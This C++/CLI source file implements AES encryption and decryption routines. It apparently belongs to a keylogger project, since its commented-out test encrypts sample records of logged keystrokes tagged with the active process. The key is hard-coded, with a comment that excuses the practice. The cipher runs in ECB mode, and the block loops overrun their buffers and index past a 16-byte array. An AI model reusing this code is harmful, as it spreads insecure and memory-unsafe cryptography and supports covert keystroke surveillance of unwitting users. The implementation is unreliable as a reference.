#include "encryption_manager.h"

using namespace System;
using namespace System::Runtime::InteropServices;


//[DllImport("libcrypto-1_1.dll")]
//extern int AES_set_encrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);

//[DllImport("libcrypto-1_1.dll")]
//extern void AES_encrypt(const unsigned char *in, unsigned char *out, const AES_KEY *key);

//[DllImport("libcrypto-1_1.dll")]
//extern void AES_decrypt(const unsigned char *in, unsigned char *out, const AES_KEY *key);

//[DllImport("libcrypto-1_1.dll")]
//extern int AES_set_decrypt_key(const unsigned char *userKey, const int bits, AES_KEY *key);


// this is typically not a great thing to do.
// acknowledging this fact makes it ok.
static const unsigned char key[] = "4nA^9yFLjQpxC79t9J6kYlwsDf4AZqA%";

/*
description: Encrypted the string contained in plaintext and puts the encrypted data in the array pointed
to by ciphertext, of length len.  len should be the length of the string.  May not work for more interesting
encoding options.
params: string plaintext, the text to be encrypted.
        unsigned char* ciphertext, a pointer to an array of the same length as plaintext that will
        be populated with the encrypted data
        int len, the length of both the plaintext string and the ciphertext array.
returns: 
*/
void EncryptionManager::encrypt(string plaintext, unsigned char* ciphertext, int len) {

    // number of splits we need to make (16 byte blocks)
    int iterations = ((len)/16)+1;

    // arrays to handle the input/output to the encrypt
    unsigned char enc_out[16];
    unsigned char enc_in[16];

    // set up the encryption key for use
    AES_KEY enc_key;
    AES_set_encrypt_key(key, 256, &enc_key);

	cout << "BEGIN ENCRYPTION" << endl;
    // encrypt in 16 block chunkts
    for (int i = 0; i <= iterations; i++){

        // copy the next 16 byte block of data to be encrypted
		for (int j = 0; j < 16; j++) {
			if (((i * 16) + j) > len)
				enc_in[(i * 16) + j] = 0;
			else
				enc_in[j] = plaintext[(i * 16) + j];
		}

            

        // encrypt data (enc_out will end up plaintext)
        AES_encrypt(enc_in, enc_out, &enc_key);

        // copy the encrypted data into the ciphertext array
        for (int j = 0; j < 16; j++)
            ciphertext[(i*16)+j]=enc_out[j];
    }

	cout << "END ENCRYPTION" << endl;
}

/*
description: Decrypts the data contained in ciphertext up to len chars.  Len must be in increments of 16.
params: unsigned char* ciphertext, an array containing the ciphertext
        int len, the length of data to decrypt.  Must be in increments of 16.  
        Does not have to be the entirety of ciphertext.
returns: a string of the decrypted plain text. 
*/
string EncryptionManager::decrypt(unsigned char* ciphertext, int len) {

    // number of splits we need to make (16 byte blocks)
    int iterations = ((len)/16)+1;

    // arrays to handle the input/output to the decrypt
    unsigned char dec_out[16];
    unsigned char dec_in[16];

    // a nicer array to be converted to a string later
	unsigned char* result = new unsigned char[iterations * 16];

    // sets up the decryption key for use
    AES_KEY dec_key;
    AES_set_decrypt_key(key,256,&dec_key);

    // decrypt in 16 byte blocks
    for (int i = 0; i <= iterations; i++){

        // copy the next 16 byte block of data to be decrypted
        for (int j = 0; j < 16; j++)
            dec_in[j]=ciphertext[(i*16)+j];

        // decrypt data (dec_out will end up plaintext)
        AES_decrypt(dec_in, dec_out, &dec_key);

        // copy the decrypted data into the result array
        // if we go past the len, insert nulls so that the
        // string can still be fancy
        for (int j = 0; j < 16; j++){
			//cout << "j = " << j << ", i = " << i << ", char = " << result[j] << endl;
            if ((i*16)+j >= len)
                result[(i*16)+j] = 0;
            else
                result[(i*16)+j]=dec_out[j];
        }
    }

    // convert the unsigned chars to chars.
    return string((const char*)result);
}


/*
int main()
{
    // this is the string to go through the wringer
    string plaintext = "{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}{\n\t\"active_process\": \"chrome\",\n\t\"process_id\": \"2476\",\n\t\"start_time\": \"03/31/2017-00:06:43\",\n\t\"end_time\": \"03/31/2017-00:12:23\",\n\t\"session_duration\": \"340\",\n\t\"logged_keystrokes\": \"This is a sample of wh@t the keylogg3r will be l0gging.\"\n}";

    // instantiate a new EncryptionManager object
    EncryptionManager em;

    // retrieve the length of the data to encrypt.  This will also be the size
    // of the ciphertext array.
    int len = plaintext.length();
	unsigned char* ciphertext = new unsigned char[len];
    // send the plaintext and the pointer to the ciphertext array to get encrypted.
    // ciphertext will get populated with encrypted text (plaintext will still exist)
    em.encrypt(plaintext, ciphertext, len);

    // decrypt the ciphertext up to len and return the plaintext string
    string decrypted = em.decrypt(ciphertext, len);

    // show some results out like whoa
    //cout << "PLAINTEXT: \n\n" << plaintext << "\n\n\n";
    //cout << "ENCRYPTED: \n\n" << ciphertext << "\n\n\n";
    //cout << "DECRYPTED: " << decrypted << "\n\n\n";

    // and a zero
    return 0;
}

*/

